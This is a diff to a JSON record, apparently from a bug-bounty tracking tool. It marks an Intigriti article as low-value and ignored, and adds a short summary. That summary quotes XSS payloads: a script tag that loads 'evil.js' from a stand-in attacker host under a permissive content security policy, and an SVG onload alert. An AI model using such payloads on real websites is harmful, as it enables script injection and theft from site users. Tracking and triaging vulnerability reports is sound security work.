@@ -20,5 +20,24 @@
   "source": {
     "fetched_at": "2026-04-24T13:35:20.727918+00:00",
     "http_status": 200
+  },
+  "triage": {
+    "ignored": true,
+    "value_score": 30,
+    "reasons": [
+      "intigriti_article",
+      "has_payloads",
+      "has_steps",
+      "looks_like_general_content"
+    ]
+  },
+  "summary": {
+    "vuln_point": "Low-value item for bug-bounty tracking (likely a general article/roundup or lacks concrete repro details).",
+    "poc": [
+      "*) has been set as the declaration source, no restrictions will be applied, and a simple payload that loads an external script will be allowed to execute:",
+      "<script src=//attacker-host/evil.js></script>",
+      "'\"><svg onload=alert(/INTIGRITI/)>"
+    ],
+    "notes": "Marked ignored by heuristic triage; consider re-enriching with full text later if needed."
   }
 }
